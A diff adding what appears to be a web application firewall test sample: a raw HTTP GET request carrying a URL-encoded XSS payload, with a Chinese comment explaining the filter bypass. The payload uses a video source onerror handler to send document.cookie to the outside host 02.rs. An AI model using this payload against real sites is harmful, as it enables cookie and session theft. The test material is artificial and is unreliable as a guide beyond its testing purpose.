@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_事件_关键字替换类(无括号绕过)-06506693
+# 该xss攻击语句在页面中嵌入一个视频元素。其中的 <source> 元素用于指定视频文件的 URL，onerror 属性用于指定当视频文件无法加载时执行的回调函数。攻击语句成功执行则获取到cookie
+GET /?id=%3Cvideo%3E%3Csource%20onerror=location=%2F%5C02.rs%2F+document.cookie%3E&bid=hd_tag_m8mv25pp HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25pp
+RM-PRO-Token: 10b864501cb424b3142b88a0191202cc
+RM-PRO-Time: 1742808499423
+User-Agent: curl/7.83.1
+
